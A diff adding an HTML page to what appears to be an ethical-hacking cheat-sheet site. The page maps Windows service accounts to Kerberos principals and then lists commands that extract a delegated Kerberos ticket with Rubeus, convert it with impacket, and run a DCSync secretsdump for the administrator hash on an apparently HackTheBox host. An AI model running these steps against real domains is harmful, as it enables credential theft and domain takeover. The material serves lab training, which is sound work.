@@ -1,0 +1,71 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+    <h1>Kerberos Authentication Name</h1>
+    <table>
+        <thead>
+            <tr>
+                <th>Execnution Context</th>
+                <td>Authentication Principle</td>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td>IIS APPPOOL\xxx</td>
+                <td>DOMAIN\SERVER$</td>
+            </tr>
+            <tr>
+                <td>NT SERVICE\xxx</td>
+                <td>DOMAIN\SERVER$</td>
+            </tr>
+            <tr>
+                <td>NETWORK SERVICE</td>
+                <td>DOMAIN\SERVER$</td>
+            </tr>
+            <tr>
+                <td>LOCAL SERVICE</td>
+                <td>DOMAIN\SERVER$</td>
+            </tr>
+            <tr>
+                <td>SYSTEM</td>
+                <td>DOMAIN\SERVER$</td>
+            </tr>
+            <tr>
+                <td>local user（useradd）</td>
+                <td>Can't authenticate</td>
+            </tr>
+            <tr>
+                <td>domain user</td>
+                <td>DOMAIN\username</td>
+            </tr>
+        </tbody>
+    </table>
+
+    <h2 class="blue">If you have virtual computer account but it's not a member of admin group...</h2>
+    <div class="code-box"><pre><code>.\rubeus.exe tgtdeleg /nowrap
+[+] Successfully decrypted the authenticator
+[*] base64(ticket.kirbi):</code></pre></div>
+    <ul><li>Kerberos Ticket would be generated.</li></ul>
+
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo]
+└─$ echo GENERATED_TICKET | base64 -d > ticket.kirbi</code></pre></div>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo]
+└─$ impacket-ticketConverter ticket.kirbi ticket.ccache</code></pre></div>
+<ul><li>Set this ticket to environmental variable</li></ul>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo]
+└─$ export KRB5CCNAME=ticket.ccache </code></pre></div>
+<h2 class="blue">If the machine as DCsync right, you can DCsync</h2>
+<div class="code-box"><pre><code>impacket-secretsdump -just-dc-user administrator -k -no-pass g0.flight.htb</code></pre></div>
+
+
+
+</body>
+</html>
